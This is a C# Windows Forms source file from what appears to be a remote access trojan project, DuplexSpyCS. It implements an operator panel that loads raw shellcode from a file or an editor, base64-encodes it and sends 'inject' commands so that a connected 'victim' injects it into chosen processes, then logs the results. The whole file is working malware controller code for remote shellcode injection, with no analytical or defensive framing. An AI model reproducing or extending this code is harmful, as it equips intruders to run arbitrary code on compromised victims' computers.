using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmTaskShellcodeInjector : Form
    {
        public byte[] m_abShellCode = { };

        private clsVictim m_victim { get; set; }
        private List<(string, int)> m_lsProc { get; set; }

        public frmTaskShellcodeInjector(clsVictim victim, List<(string, int)> lsProc)
        {
            InitializeComponent();

            m_victim = victim;
            m_lsProc = lsProc;

            Text = @$"Shellcode Injector\\{m_victim.ID}";
        }

        void fnRecv(clsListener listener, clsVictim victim, List<string> lsMsg)
        {
            if (!clsTools.fnbVictimEquals(victim, m_victim))
                return;

            if (lsMsg[0] == "inject")
            {
                if (lsMsg[1] == "sc")
                {
                    int nProc = int.Parse(lsMsg[2]);
                    int nCode = int.Parse(lsMsg[3]);

                    Invoke(new Action(() =>
                    {
                        richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] {nProc} => {clsCrypto.b64D2Str(lsMsg[4])}");
                        richTextBox1.AppendText(Environment.NewLine);
                    }));
                }
            }
        }

        void fnSetup()
        {
            radioButton2.Checked = true;
            comboBox1.SelectedIndex = 2;

            foreach (var proc in m_lsProc)
            {
                ListViewItem item = new ListViewItem(proc.Item1);
                item.SubItems.Add(proc.Item2.ToString());

                listView1.Items.Add(item);
            }

            m_victim.m_listener.ReceivedDecoded += fnRecv;
        }

        private void frmTaskShellcodeInjector_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Filter = "Binary File|*.bin|Any File|*.*";

            if (ofd.ShowDialog() == DialogResult.OK)
            {
                textBox1.Text = ofd.FileName;
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            frmEditorShellcode f = new frmEditorShellcode(this);
            f.ShowDialog();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            tabControl1.SelectedIndex = 1;

            int nMethod = comboBox1.SelectedIndex;

            if (radioButton1.Checked)
            {
                string szFilePath = textBox1.Text;
                if (!File.Exists(szFilePath))
                {
                    MessageBox.Show("File not found: " + szFilePath, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                Task.Run(() =>
                {
                    byte[] abShellcode = File.ReadAllBytes(szFilePath);
                    string szb64 = Convert.ToBase64String(abShellcode);

                    foreach (var proc in m_lsProc)
                    {
                        m_victim.fnSendCommand(new string[]
                        {
                            "inject",
                            "sc",
                            proc.Item2.ToString(),
                            nMethod.ToString(),
                            szb64,
                        });
                    }
                });
            }
            else if (radioButton2.Checked)
            {
                if (m_abShellCode == null || m_abShellCode.Length == 0)
                {
                    MessageBox.Show("Shellcode is not specified.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                Task.Run(() =>
                {
                    string szb64 = Convert.ToBase64String(m_abShellCode);

                    foreach (var proc in m_lsProc)
                    {
                        m_victim.fnSendCommand(new string[]
                        {
                            "inject",
                            "sc",
                            proc.Item2.ToString(),
                            nMethod.ToString(),
                            szb64,
                        });
                    }
                });
            }
        }

        private void frmTaskShellcodeInjector_FormClosed(object sender, FormClosedEventArgs e)
        {
            m_victim.m_listener.ReceivedDecoded -= fnRecv;
        }
    }
}
